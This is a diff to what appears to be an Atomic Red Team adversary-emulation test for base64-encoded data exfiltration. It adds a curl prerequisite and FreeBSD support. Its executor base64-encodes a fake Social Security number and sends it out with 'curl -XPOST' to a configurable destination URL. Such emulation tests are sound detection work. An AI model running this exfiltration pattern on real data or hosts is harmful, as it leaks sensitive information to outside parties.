@@ -17,9 +17,17 @@ atomic_tests:
       description: Encoded data to post using fake Social Security number 111-11-1111.
       type: string
       default: MTExLTExLTExMTE=
+  dependencies:
+  - description: |
+      Requires curl
+    prereq_command: |
+      if [ -x "$(command -v curl)" ]; then exit 0; else exit 1; fi;      
+    get_prereq_command: |
+      (which apt && apt update && apt install -y curl) || (which pkg && pkg update && pkg install -y curl)
   executor:
     command: |
-      echo -n 111-11-1111 | base64
+      if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64encode -r -"; else cmd="base64"; fi;
+      echo -n 111-11-1111 | $cmd
       curl -XPOST #{base64_data}.#{destination_url}
     name: sh
 - name: Base64 Encoded data (freebsd)
@@ -38,13 +46,6 @@ atomic_tests:
       type: string
       default: MTExLTExLTExMTE=
   dependency_executor_name: sh
-  dependencies:
-  - description: |
-      Requires curl
-    prereq_command: |
-      if [ -x "$(command -v curl)" ]; then exit 0; else exit 1; fi;      
-    get_prereq_command: |
-      pkg install -y curl
   executor:
     command: |
       echo -n 111-11-1111 | b64encode -r -
